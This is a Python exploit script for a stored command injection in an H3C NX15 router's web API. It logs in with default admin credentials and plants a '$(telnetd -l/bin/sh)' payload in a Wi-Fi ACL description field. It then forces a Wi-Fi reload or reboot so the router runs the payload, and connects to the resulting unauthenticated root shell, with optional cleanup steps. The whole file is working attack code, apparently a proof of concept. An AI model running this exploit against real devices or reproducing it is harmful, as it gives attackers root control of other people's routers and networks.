#!/usr/bin/env python3
import argparse
import copy
import json
import socket
import sys
import time

import requests


def log(msg: str) -> None:
    print(msg, flush=True)


def login(base: str, username: str, password: str) -> str:
    r = requests.post(
        base.rstrip('/') + '/api/login/auth',
        json={'username': username, 'password': password},
        timeout=10,
    )
    r.raise_for_status()
    body = r.json()
    if body.get('code') != 0:
        raise RuntimeError(f'login failed: {body}')
    return body['data']['session']


def esps(base: str, session: str, body, timeout: int = 30):
    headers = {'AUTHENTICATION': session, 'Content-Type': 'application/json'}
    r = requests.post(base.rstrip('/') + '/api/esps', headers=headers, data=json.dumps(body), timeout=timeout)
    r.raise_for_status()
    try:
        return r.json()
    except Exception:
        return r.text


def wait_port(host: str, port: int, timeout: int = 120, expect_open: bool = True) -> bool:
    end = time.time() + timeout
    while time.time() < end:
        s = socket.socket()
        s.settimeout(1.5)
        try:
            s.connect((host, port))
            s.close()
            if expect_open:
                return True
        except Exception:
            if not expect_open:
                return True
        time.sleep(1)
    return False


def connect_shell(host: str, port: int, timeout: float = 6.0):
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((host, port))
    time.sleep(0.3)
    banner = b''
    try:
        banner += s.recv(4096)
    except Exception:
        pass
    return s, banner


def get_ssid_list(base: str, session: str):
    req = [
        {
            'id': 20,
            'object': 'esps.wifi',
            'method': 'getssid',
            'param': {
                'list': [
                    {'radio': '2.4G', 'index': 'SSID1'},
                    {'radio': '5G', 'index': 'SSID1'},
                ]
            },
        }
    ]
    resp = esps(base, session, req)
    if isinstance(resp, str):
        raise RuntimeError(f'unexpected getssid response: {resp}')
    item = resp[0].get('result', {})
    if item.get('code') != 0:
        raise RuntimeError(f'getssid failed: {resp}')
    return item.get('data', {}).get('list', [])


def find_ssid_entry(entries, radio: str, index: str):
    for item in entries:
        if item.get('radio') == radio and item.get('index') == index:
            return item
    raise KeyError(f'SSID entry not found: radio={radio} index={index}')


def setssid(base: str, session: str, entries):
    req = [
        {
            'id': 21,
            'object': 'esps.wifi',
            'method': 'setssid',
            'param': {'list': entries},
        }
    ]
    return esps(base, session, req, timeout=40)


def normalize_ssid_entry(entry: dict) -> dict:
    out = copy.deepcopy(entry)
    for key in ('keyPeriod', 'vlan', 'accessMax'):
        try:
            out[key] = int(out[key])
        except Exception:
            pass
    out.setdefault('status', 'enable')
    out.setdefault('charset', 'utf8')
    out.setdefault('bssid', '')
    out.setdefault('curCountryCode', '')
    return out


def run_shell_cmd(sock: socket.socket, cmd: str, end_marker: str = '__END__') -> str:
    sock.sendall(f'{cmd}; echo {end_marker}\n'.encode())
    time.sleep(0.6)
    data = b''
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if end_marker.encode() in data or len(data) > 65535:
                break
    except Exception:
        pass
    return data.decode('latin1', 'ignore')


def build_payload(port: int, extra_cmd: str = '') -> str:
    cmd = f'/usr/sbin/telnetd -p{port} -l/bin/sh'
    if extra_cmd:
        cmd = f'{extra_cmd};{cmd}'
    payload = f'$({cmd})'
    if len(payload) > 64:
        raise ValueError(f'payload too long for ACL description field ({len(payload)} bytes)')
    return payload


def main() -> int:
    ap = argparse.ArgumentParser(
        description='H3C NX15 R017 post-auth stored root RCE via esps.wifi.acl description -> hostapd.sh eval on Wi-Fi reload'
    )
    ap.add_argument('--base', default='http://192.168.8.1', help='router base URL')
    ap.add_argument('--username', default='admin', help='web admin username')
    ap.add_argument('--password', default='admin123', help='web admin password')
    ap.add_argument('--host', default='192.168.8.1', help='target host')
    ap.add_argument('--port', type=int, default=2482, help='temporary telnetd port opened after reload/boot trigger')
    ap.add_argument('--mac', default='02:11:22:33:44:55', help='ACL entry MAC used for storage payload')
    ap.add_argument('--trigger', choices=['none', 'reboot', 'setssid-hide-toggle'], default='setssid-hide-toggle', help='web trigger after staging payload')
    ap.add_argument('--trigger-radio', default='5G', help='radio used for setssid-hide-toggle trigger')
    ap.add_argument('--trigger-index', default='SSID1', help='SSID index used for setssid-hide-toggle trigger')
    ap.add_argument('--preclean-mac', action='store_true', help='delete the chosen ACL MAC before staging to make reruns easier')
    ap.add_argument('--wait-up', type=int, default=180, help='seconds to wait for target to come back after reboot')
    ap.add_argument('--cleanup-entry', action='store_true', help='remove ACL entry by MAC after verification')
    ap.add_argument('--restore-config', action='store_true', help='restore the toggled SSID config after verification (recommended with setssid-hide-toggle)')
    ap.add_argument('--kill-telnetd', action='store_true', help='kill the temporary telnetd after verification')
    ap.add_argument('--extra-cmd', default='', help='optional extra shell command prepended inside the stored payload')
    args = ap.parse_args()

    payload = build_payload(args.port, args.extra_cmd)

    log('[*] Step 1: login')
    session = login(args.base, args.username, args.password)
    log(f'[*] session = {session}')

    if args.preclean_mac:
        log('[*] Step 1.5: pre-clean old ACL entry by MAC (ignore result)')
        try:
            resp = esps(args.base, session, [{'id': 90, 'object': 'esps.wifi.acl', 'method': 'delbymac', 'param': {'list': [args.mac]}}])
            print(json.dumps(resp, ensure_ascii=False, indent=2) if not isinstance(resp, str) else resp)
        except Exception as e:
            log(f'[*] pre-clean warning: {e}')

    log('[*] Step 2: stage malicious ACL description via esps.wifi.acl.add')
    body = [
        {
            'id': 1,
            'object': 'esps.wifi.acl',
            'method': 'add',
            'param': {
                'radio': ['2.4G', '5G'],
                'mac': args.mac,
                'description': payload,
                'isAllowWifi': 'false',
            },
        }
    ]
    resp = esps(args.base, session, body)
    print(json.dumps(resp, ensure_ascii=False, indent=2) if not isinstance(resp, str) else resp)

    log('[*] Step 3: verify the payload is stored (getlist should echo the literal description)')
    verify = esps(args.base, session, [{'id': 2, 'object': 'esps.wifi.acl', 'method': 'getlist', 'param': {}}])
    print(json.dumps(verify, ensure_ascii=False, indent=2) if not isinstance(verify, str) else verify)

    original_entry = None
    restored_entry = None

    if args.trigger == 'none':
        log('[*] Payload staged. Execution occurs on next wifi reload / hostapd config regeneration / reboot.')
        log('[*] Re-run with --trigger setssid-hide-toggle for the confirmed pure-Web trigger path.')
    elif args.trigger == 'reboot':
        log('[*] Step 4: trigger reboot via web')
        try:
            reboot_resp = esps(args.base, session, [{'id': 3, 'object': 'esps.system', 'method': 'reboot', 'param': {'reboottype': ''}}], timeout=10)
            print(json.dumps(reboot_resp, ensure_ascii=False, indent=2) if not isinstance(reboot_resp, str) else reboot_resp)
        except Exception as e:
            log(f'[*] reboot request raced with target shutdown: {e}')

        log('[*] Waiting for HTTP to go down...')
        wait_port(args.host, 80, timeout=30, expect_open=False)
        log('[*] Waiting for HTTP to come back...')
        if not wait_port(args.host, 80, timeout=args.wait_up, expect_open=True):
            log('[-] target HTTP did not return in time')
            return 2

        log(f'[*] Waiting for staged telnetd on {args.host}:{args.port} ...')
        if not wait_port(args.host, args.port, timeout=60, expect_open=True):
            log('[-] staged shell port did not appear; payload may still be pending another wifi reload path')
            return 3

        sock, banner = connect_shell(args.host, args.port)
        print(banner.decode('latin1', 'ignore'))
        proof = run_shell_cmd(sock, f'id; uname -a; ps w | grep "telnetd -p{args.port}" | grep -v grep')
        print(proof)
        sock.close()
        if 'uid=0(root)' in proof:
            log('[+] SUCCESS: stored RCE triggered and root shell obtained')
        else:
            log('[-] shell opened but expected proof was incomplete')
            return 4
    elif args.trigger == 'setssid-hide-toggle':
        log('[*] Step 4: fetch current 2.4G/5G SSID configuration')
        entries = get_ssid_list(args.base, session)
        print(json.dumps(entries, ensure_ascii=False, indent=2))
        original_entry = normalize_ssid_entry(find_ssid_entry(entries, args.trigger_radio, args.trigger_index))
        toggled_entry = normalize_ssid_entry(original_entry)
        toggled_entry['hide'] = 'enable' if str(original_entry.get('hide', 'disable')).lower() != 'enable' else 'disable'

        log(f'[*] Step 5: trigger hostapd regeneration via esps.wifi.setssid ({args.trigger_radio}/{args.trigger_index}) hide {original_entry.get("hide")} -> {toggled_entry.get("hide")}')
        resp = setssid(args.base, session, [toggled_entry])
        print(json.dumps(resp, ensure_ascii=False, indent=2) if not isinstance(resp, str) else resp)

        log(f'[*] Waiting for staged telnetd on {args.host}:{args.port} ...')
        if not wait_port(args.host, args.port, timeout=60, expect_open=True):
            log('[-] staged shell port did not appear after setssid trigger')
            return 3

        sock, banner = connect_shell(args.host, args.port)
        print(banner.decode('latin1', 'ignore'))
        proof = run_shell_cmd(sock, f'id; uname -a; ps w | grep "telnetd -p{args.port}" | grep -v grep')
        print(proof)
        if 'uid=0(root)' not in proof:
            log('[-] shell opened but expected root proof was incomplete')
            sock.close()
            return 4
        log('[+] SUCCESS: pure-Web stored RCE triggered and root shell obtained')

        if args.cleanup_entry:
            log('[*] Cleanup: delete ACL entry by MAC before restoring Wi-Fi config')
            cleanup = esps(args.base, session, [{'id': 9, 'object': 'esps.wifi.acl', 'method': 'delbymac', 'param': {'list': [args.mac]}}])
            print(json.dumps(cleanup, ensure_ascii=False, indent=2) if not isinstance(cleanup, str) else cleanup)

        if args.restore_config:
            log('[*] Cleanup: restore original SSID hide setting')
            resp = setssid(args.base, session, [original_entry])
            print(json.dumps(resp, ensure_ascii=False, indent=2) if not isinstance(resp, str) else resp)
            refreshed = get_ssid_list(args.base, session)
            restored_entry = normalize_ssid_entry(find_ssid_entry(refreshed, args.trigger_radio, args.trigger_index))
            print(json.dumps(restored_entry, ensure_ascii=False, indent=2))

        if args.kill_telnetd:
            log('[*] Cleanup: kill temporary telnetd')
            print(run_shell_cmd(sock, f"pid=$(ps w | awk '/telnetd -p{args.port}/ && !/awk/ {{print $1}}' | head -n1); [ -n \"$pid\" ] && kill $pid; echo cleaned"))
            if wait_port(args.host, args.port, timeout=15, expect_open=False):
                log('[*] temporary telnetd port is now closed')
            else:
                log('[!] temporary telnetd port still appears open')
        sock.close()

    if args.cleanup_entry and args.trigger != 'setssid-hide-toggle':
        log('[*] Cleanup: delete ACL entry by MAC')
        cleanup = esps(args.base, session, [{'id': 9, 'object': 'esps.wifi.acl', 'method': 'delbymac', 'param': {'list': [args.mac]}}])
        print(json.dumps(cleanup, ensure_ascii=False, indent=2) if not isinstance(cleanup, str) else cleanup)

    if args.trigger == 'setssid-hide-toggle':
        log('[*] Final state check: ACL list')
        final_acl = esps(args.base, session, [{'id': 30, 'object': 'esps.wifi.acl', 'method': 'getlist', 'param': {}}])
        print(json.dumps(final_acl, ensure_ascii=False, indent=2) if not isinstance(final_acl, str) else final_acl)
        if restored_entry is not None:
            log(f'[*] Restored hide={restored_entry.get("hide")} for {args.trigger_radio}/{args.trigger_index}')

    return 0


if __name__ == '__main__':
    sys.exit(main())
